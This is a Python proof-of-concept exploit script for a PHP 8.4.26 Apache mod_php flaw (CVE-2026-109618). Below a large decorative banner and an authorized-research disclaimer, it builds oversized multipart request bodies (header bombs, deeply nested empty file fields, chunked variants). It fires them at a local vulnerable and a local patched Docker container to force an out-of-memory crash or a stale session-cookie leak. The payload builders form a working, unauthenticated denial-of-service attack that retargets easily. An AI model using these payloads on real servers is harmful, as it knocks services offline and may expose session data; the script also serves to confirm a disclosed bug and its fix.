#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: CVE-2026-109618 (Critical: 9.2)
#  Vendor: PHP (The PHP Group)
#  Versions: PHP 8.4.26 apache2handler (fixed in 8.4.27)
#  Impact: Unauth OOM longjmp during multipart parse before app code
#  Requires: Apache mod_php; finite memory_limit; loopback lab
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "CVE-2026-109618"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Mail", _EMAIL),):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs"
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove PHP CVE-2026-109618 OOM longjmp half-initialized request cleanup."""

import os
import socket
import subprocess
from dataclasses import dataclass
from pathlib import Path

LABEL = "CVE-2026-109618"
WITNESS = "CVE-2026-109618-OOM-WITNESS"
HOST = "127.0.0.1"
VULN_PORT = 18220
PATCHED_PORT = 18221
VULN_IMAGE = "php:8.4.26-apache"
PATCHED_IMAGE = "php:8.4.27-apache"
SAPI = "apache2handler"
COMPOSE = os.environ.get("COMPOSE_PROJECT_NAME", "cve-2026-109618")
HERE = Path(__file__).resolve().parent
ALIVE = "CVE-2026-109618-ALIVE"
BOUNDARY = "----CVE2026109618OOM"
PATH = "/index.php"
TIMEOUT_S = 40.0
CHUNK_SIZE = 8192

CRASH_NEEDLES = (
    "segmentation fault",
    "exit signal",
    "zend_mm_heap corrupted",
    "addresssanitizer",
    "heap-use-after-free",
    "heap-buffer-overflow",
    "use of uninitialized",
    "use-after-free",
    "signal 11",
    "signal 6",
    "sigsegv",
    "sigabrt",
    "caught sigsegv",
    "caught sigabrt",
    "ah00052",
    "ah00051",
)
HARD_OOM_NEEDLES = (
    "hard memory limit",
    "_exit(137)",
)
OOM_NEEDLES = (
    "allowed memory size",
    "out of memory",
    "exhausted",
)


@dataclass
class HttpResult:
    complete: bool
    reset: bool
    timeout: bool
    status: int
    headers: str
    body: bytes
    error: str
    sent: int


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def clip(text: str, limit: int = 240) -> str:
    text = text.replace("\r\n", "\\n").replace("\n", "\\n")
    if len(text) > limit:
        return text[:limit] + "..."
    return text


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def service_logs(service: str, tail: int = 250) -> str:
    proc = compose("logs", "--no-color", "--tail", str(tail), service, timeout=30)
    return (proc.stdout or "") + (proc.stderr or "")


def service_status() -> str:
    proc = compose("ps", "-a", "--format", "{{.Service}} {{.Status}}", timeout=30)
    return ((proc.stdout or "") + (proc.stderr or "")).strip()


def php_version(service: str) -> str:
    proc = compose("exec", "-T", service, "php", "-v", timeout=30)
    lines = (proc.stdout or proc.stderr or "").splitlines()
    return " | ".join(lines[:2])


def image_tag(service: str) -> str:
    proc = compose(
        "exec",
        "-T",
        service,
        "php",
        "-r",
        "echo PHP_VERSION, ' ', PHP_SAPI;",
        timeout=30,
    )
    return (proc.stdout or "").strip()


def _recv_all(sock: socket.socket, limit: int = 2_000_000) -> bytes:
    chunks = bytearray()
    while len(chunks) < limit:
        piece = sock.recv(65536)
        if not piece:
            break
        chunks.extend(piece)
    return bytes(chunks)


def parse_http(blob: bytes) -> tuple[int, str, bytes]:
    if not blob:
        return 0, "", b""
    head, sep, body = blob.partition(b"\r\n\r\n")
    if not sep:
        text = blob.decode("latin-1", "replace")
        return 0, text, b""
    header_text = head.decode("latin-1", "replace")
    status = 0
    first = header_text.split("\r\n", 1)[0]
    parts = first.split()
    if len(parts) >= 2 and parts[1].isdigit():
        status = int(parts[1])
    return status, header_text, body


def transact(host: str, port: int, payload: bytes) -> HttpResult:
    try:
        with socket.create_connection((host, port), TIMEOUT_S) as sock:
            sock.settimeout(TIMEOUT_S)
            sock.sendall(payload)
            sock.shutdown(socket.SHUT_WR)
            raw = _recv_all(sock)
    except TimeoutError:
        return HttpResult(False, False, True, 0, "", b"", "timeout", len(payload))
    except socket.timeout:
        return HttpResult(False, False, True, 0, "", b"", "timeout", len(payload))
    except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as exc:
        return HttpResult(False, True, False, 0, "", b"", str(exc), len(payload))
    except OSError as exc:
        err = str(exc).lower()
        reset = any(tok in err for tok in ("reset", "broken pipe", "connection abort"))
        return HttpResult(False, reset, False, 0, "", b"", str(exc), len(payload))
    status, headers, body = parse_http(raw)
    return HttpResult(True, False, False, status, headers, body, "", len(payload))


def transact_chunked(host: str, port: int, header: bytes, body: bytes) -> HttpResult:
    sent = len(header) + len(body)
    try:
        with socket.create_connection((host, port), TIMEOUT_S) as sock:
            sock.settimeout(TIMEOUT_S)
            sock.sendall(header)
            offset = 0
            while offset < len(body):
                piece = body[offset : offset + CHUNK_SIZE]
                sock.sendall(f"{len(piece):x}\r\n".encode("ascii") + piece + b"\r\n")
                offset += len(piece)
            sock.sendall(b"0\r\n\r\n")
            sock.shutdown(socket.SHUT_WR)
            raw = _recv_all(sock)
    except TimeoutError:
        return HttpResult(False, False, True, 0, "", b"", "timeout", sent)
    except socket.timeout:
        return HttpResult(False, False, True, 0, "", b"", "timeout", sent)
    except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as exc:
        return HttpResult(False, True, False, 0, "", b"", str(exc), sent)
    except OSError as exc:
        err = str(exc).lower()
        reset = any(tok in err for tok in ("reset", "broken pipe", "connection abort"))
        return HttpResult(False, reset, False, 0, "", b"", str(exc), sent)
    status, headers, body_out = parse_http(raw)
    return HttpResult(True, False, False, status, headers, body_out, "", sent)


def get_probe(host: str, port: int) -> HttpResult:
    req = (
        f"GET {PATH} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("ascii")
    return transact(host, port, req)


def chunked_header(host: str, port: int) -> bytes:
    return (
        f"POST {PATH} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("ascii")


def length_header(host: str, port: int, size: int) -> bytes:
    return (
        f"POST {PATH} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {size}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("ascii")


def form_part(name: str, value: str) -> bytes:
    return (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="{name}"\r\n'
        "\r\n"
        f"{value}\r\n"
    ).encode("ascii")


def empty_file_part(name: str, extra_headers: int, header_size: int) -> bytes:
    lines = [
        f"--{BOUNDARY}\r\n",
        f'Content-Disposition: form-data; name="{name}"; filename=""\r\n',
        "Content-Type: application/octet-stream\r\n",
    ]
    pad = "A" * header_size
    for i in range(extra_headers):
        lines.append(f"X-Pad-{i}: {pad}\r\n")
    lines.append("\r\n")
    return "".join(lines).encode("ascii")


def nested_name(index: int, depth: int) -> str:
    pieces = [str(index)] + [str(d) for d in range(depth)]
    return "f[" + "][".join(pieces) + "]"


def build_nested_body(
    count: int,
    depth: int,
    extra_headers: int,
    header_size: int,
) -> bytes:
    parts = [
        form_part("PHP_SESSION_UPLOAD_PROGRESS", "oomlab"),
        form_part("PHPSESSID", "oomlabid"),
    ]
    for i in range(count):
        parts.append(empty_file_part(nested_name(i, depth), extra_headers, header_size))
    parts.append(f"--{BOUNDARY}--\r\n".encode("ascii"))
    return b"".join(parts)


def build_header_bomb(num_headers: int, header_size: int) -> bytes:
    pad = "B" * header_size
    lines = [
        f"--{BOUNDARY}\r\n",
        'Content-Disposition: form-data; name="h"; filename="x"\r\n',
    ]
    for i in range(num_headers):
        lines.append(f"X-Pad-{i}: {pad}\r\n")
    lines.append("\r\nZ\r\n")
    lines.append(f"--{BOUNDARY}--\r\n")
    prefix = [
        form_part("PHP_SESSION_UPLOAD_PROGRESS", "oomlab"),
        form_part("PHPSESSID", "oomlabid"),
    ]
    return b"".join(prefix) + "".join(lines).encode("ascii")


def build_followup_body() -> bytes:
    return (
        form_part("PHP_SESSION_UPLOAD_PROGRESS", "follow")
        + empty_file_part("tiny", 0, 0)
        + f"--{BOUNDARY}--\r\n".encode("ascii")
    )


def send_trigger(host: str, port: int, body: bytes, chunked: bool) -> HttpResult:
    if chunked:
        return transact_chunked(host, port, chunked_header(host, port), body)
    return transact(host, port, length_header(host, port, len(body)) + body)


def summarize(name: str, result: HttpResult) -> None:
    body = result.body.decode("utf-8", "replace")
    log(
        f"{name} complete={int(result.complete)} reset={int(result.reset)} "
        f"timeout={int(result.timeout)} status={result.status} sent={result.sent} "
        f"error={result.error!r} headers={clip(result.headers, 180)!r} "
        f"body={clip(body, 180)!r}"
    )


def blob_has(blob: str, needles: tuple[str, ...]) -> bool:
    low = blob.lower()
    return any(n in low for n in needles)


def cookie_php_sessid(headers: str) -> str:
    for line in headers.split("\r\n"):
        if line.lower().startswith("set-cookie:") and "phpsessid=" in line.lower():
            return line.split(":", 1)[1].strip()
    return ""


def is_alive(result: HttpResult) -> bool:
    if not result.complete or result.reset:
        return False
    text = result.body.decode("utf-8", "replace")
    return result.status == 200 and ALIVE in text


def body_text(result: HttpResult) -> str:
    return result.body.decode("utf-8", "replace")


def oom_startup_fatal(result: HttpResult, logs: str) -> bool:
    text = body_text(result).lower()
    log_hit = blob_has(logs, OOM_NEEDLES) and "unknown on line 0" in logs.lower()
    body_hit = (
        "allowed memory size" in text
        and "unknown" in text
        and "on line" in text
        and ALIVE not in body_text(result)
    )
    return body_hit or (log_hit and ALIVE not in body_text(result))


def crash_how(result: HttpResult, logs: str) -> str | None:
    if result.reset:
        return "connection-reset"
    if blob_has(logs, CRASH_NEEDLES):
        if "addresssanitizer" in logs.lower() or "heap-use-after-free" in logs.lower():
            return "asan-uaf"
        if "zend_mm_heap corrupted" in logs.lower():
            return "zend-mm-heap-corrupted"
        if "segmentation fault" in logs.lower() or "signal 11" in logs.lower():
            return "segfault"
        return "worker-abort"
    if oom_startup_fatal(result, logs):
        return "oom-longjmp-startup-fatal"
    if result.timeout and not result.complete:
        return "timeout-incomplete"
    if (not result.complete) and result.status == 0:
        return "incomplete"
    return None


def patched_clean(result: HttpResult, logs: str) -> bool:
    if result.reset or blob_has(logs, CRASH_NEEDLES) or blob_has(logs, HARD_OOM_NEEDLES):
        return False
    if result.timeout and not result.complete:
        return False
    if is_alive(result):
        return True
    if oom_startup_fatal(result, logs):
        return False
    if result.status in (200, 400, 411, 413, 500) or (
        result.complete and result.status == 0 and not result.body
    ):
        return True
    return result.complete and not result.reset


def ioc_logs(service: str, logs: str, status: str) -> None:
    log(f"IOC {service}-status {status!r}")
    for line in logs.splitlines():
        low = line.lower()
        if any(
            tok in low
            for tok in (
                "segmentation",
                "signal",
                "asan",
                "addresssanitizer",
                "heap",
                "abort",
                "fatal",
                "memory",
                "exhausted",
                "error",
                "child pid",
            )
        ):
            log(f"IOC {service}-log {clip(line.strip(), 300)}")


def build_seed_then_header_bomb(num_headers: int, header_size: int) -> bytes:
    seed = (
        form_part("PHP_SESSION_UPLOAD_PROGRESS", "oomlab")
        + form_part("PHPSESSID", "oomlabid")
        + (
            f"--{BOUNDARY}\r\n"
            'Content-Disposition: form-data; name="seed"; filename="s.bin"\r\n'
            "Content-Type: application/octet-stream\r\n"
            "\r\n"
            "SEED\r\n"
        ).encode("ascii")
    )
    return seed + build_header_bomb(num_headers, header_size)


TRIGGERS: tuple[tuple[str, bytes, bool], ...] = (
    ("header-bomb-chunked", build_header_bomb(3000, 2500), True),
    ("header-bomb-length", build_header_bomb(3000, 2500), False),
    ("seed-then-header-bomb-chunked", build_seed_then_header_bomb(3000, 2500), True),
    ("nested-empty-files-chunked", build_nested_body(4000, 16, 0, 0), True),
)


def main() -> int:
    log(
        f"label={LABEL} vuln={HOST}:{VULN_PORT} patched={HOST}:{PATCHED_PORT} "
        f"vuln-image={VULN_IMAGE} patched-image={PATCHED_IMAGE} sapi={SAPI}"
    )
    log("vuln-php " + php_version("vuln"))
    log("patched-php " + php_version("patched"))
    vuln_tag = image_tag("vuln") or VULN_IMAGE
    patched_tag = image_tag("patched") or PATCHED_IMAGE
    log(f"vuln-runtime {vuln_tag!r} patched-runtime {patched_tag!r}")

    log("== GET probes ==")
    vuln_get = get_probe(HOST, VULN_PORT)
    patched_get = get_probe(HOST, PATCHED_PORT)
    summarize("vuln-get", vuln_get)
    summarize("patched-get", patched_get)
    if not is_alive(vuln_get):
        return fail("vuln-get-not-alive")
    if not is_alive(patched_get):
        return fail("patched-get-not-alive")
    if "8.4.26" not in vuln_get.body.decode("utf-8", "replace"):
        return fail("vuln-not-8.4.26")
    if "8.4.27" not in patched_get.body.decode("utf-8", "replace"):
        return fail("patched-not-8.4.27")

    follow = build_followup_body()
    status_blob = service_status()
    log(f"IOC compose-ps {clip(status_blob, 200)}")

    for name, body, chunked in TRIGGERS:
        log(
            f"== trigger {name} bytes={len(body)} chunked={int(chunked)} =="
        )
        patched = send_trigger(HOST, PATCHED_PORT, body, chunked)
        summarize(f"patched-{name}", patched)
        patched_logs = service_logs("patched")
        ioc_logs("patched", patched_logs, service_status())
        patched_ok = patched_clean(patched, patched_logs)
        patched_after = get_probe(HOST, PATCHED_PORT)
        summarize("patched-after", patched_after)
        if not is_alive(patched_after):
            patched_ok = False
        log(f"patched-ok={int(patched_ok)}")
        if not patched_ok:
            log(f"IOC patched-not-ok-on {name}; try next trigger")
            continue

        vuln = send_trigger(HOST, VULN_PORT, body, chunked)
        summarize(f"vuln-{name}", vuln)
        vuln_logs = service_logs("vuln")
        ioc_logs("vuln", vuln_logs, service_status())
        how = crash_how(vuln, vuln_logs)
        log(f"vuln-crash-how={how}")

        leak_how: str | None = None
        if how is None:
            follow_v = send_trigger(HOST, VULN_PORT, follow, False)
            summarize(f"vuln-follow-{name}", follow_v)
            vuln_logs = service_logs("vuln")
            ioc_logs("vuln-follow", vuln_logs, service_status())
            how = crash_how(follow_v, vuln_logs)
            cookie = cookie_php_sessid(follow_v.headers)
            log(f"IOC vuln-follow-cookie {clip(cookie, 160)!r} len={len(cookie)}")
            if how is None and len(cookie) > 200:
                leak_how = "stale-phpsessid-uninit-read"
            follow_p = send_trigger(HOST, PATCHED_PORT, follow, False)
            summarize(f"patched-follow-{name}", follow_p)
            p_cookie = cookie_php_sessid(follow_p.headers)
            log(f"IOC patched-follow-cookie {clip(p_cookie, 160)!r} len={len(p_cookie)}")
            if leak_how and len(p_cookie) > 200:
                leak_how = None

        if how is None and leak_how:
            how = leak_how

        vuln_after = get_probe(HOST, VULN_PORT)
        summarize("vuln-after", vuln_after)
        patched_final = get_probe(HOST, PATCHED_PORT)
        summarize("patched-final", patched_final)
        if not is_alive(patched_final):
            log(f"IOC patched-died-after {name}")
            continue

        if how is None:
            log(f"IOC vuln-no-crash-on {name}")
            continue

        log(
            f"SUCCESS {LABEL} vuln-crash=yes patched-ok=yes sapi={SAPI} "
            f"vuln-image={VULN_IMAGE} patched-image={PATCHED_IMAGE} "
            f"how={how} trigger={name} asan=no {WITNESS}"
        )
        return 0

    return fail("trigger-did-not-distinguish-last-affected-vs-patched")


if __name__ == "__main__":
    raise SystemExit(main())


